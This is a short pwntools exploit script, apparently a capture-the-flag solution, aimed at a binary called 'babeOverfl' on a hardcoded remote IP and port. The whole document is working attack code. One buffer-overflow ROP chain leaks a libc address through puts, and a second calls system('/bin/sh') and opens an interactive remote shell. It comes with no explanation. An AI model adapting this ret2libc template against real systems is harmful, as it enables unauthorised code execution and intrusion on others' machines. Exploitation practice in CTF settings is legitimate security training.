from pwn import *
import sys
import os

remote_ip, port = '34.126.117.181', 3333
binary = './babeOverfl'

if len(sys.argv)>1:
    io = remote(remote_ip, port)

else:
    io = process(binary,env={"LD_PRELOAD":"./libc.so.6"})
    gdb.attach(io)

pop_rdi = 0x40132b
pop_rsir15 = 0x401329
read = 0x401060
atoi = 0x401070
gadget = 0x401308
pop_r12131415 = 0x401322
puts = 0x401030
rett = 0x004012c5

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if __name__== "__main__":
    sla("Input: \n",str(0x4011a1))
    
    ropchain = ''
    ropchain += p64(rett)
    ropchain += p64(pop_rdi)
    ropchain += p64(0x404038)
    ropchain += p64(puts)
    ropchain += p64(0x40125e)
    payload = ''
    payload += 'a'*110
    payload += ropchain

    sl(payload)
    leak1 = u64(io.recv(6).ljust(8,"\x00"))
    log.info("Atoi: "+hex(leak1))

    libc_base = leak1 - 0x040730
    system = libc_base + 0x04f4e0
    binsh = libc_base + 0x1b40fa
    log.info("Base: "+hex(libc_base))
    log.info("System: "+hex(system))

    sla("Input: \n",str(0x4011a1))
    
    ropchain = ''
    ropchain += p64(rett)
    ropchain += p64(pop_rdi)
    ropchain += p64(binsh)
    ropchain += p64(system)
    payload = ''
    payload += 'a'*126
    payload += 'b'*8
    payload += ropchain

    sl(payload)
    log.info("Payload sent!")
    io.interactive()
